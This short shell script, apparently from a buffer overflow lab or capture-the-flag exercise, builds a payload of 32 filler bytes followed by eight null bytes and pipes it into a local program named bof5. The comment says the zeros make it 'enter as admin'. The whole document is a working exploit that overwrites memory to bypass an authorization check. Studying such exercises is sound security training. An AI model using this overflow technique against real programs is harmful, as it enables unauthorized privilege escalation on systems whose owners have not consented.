# fill the buffer
payload='AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH'
# put 0 to enter as admin
payload="$payload\x00\x00\x00\x00\x00\x00\x00\x00"

echo -e $payload
echo -ne $payload | ./bof5
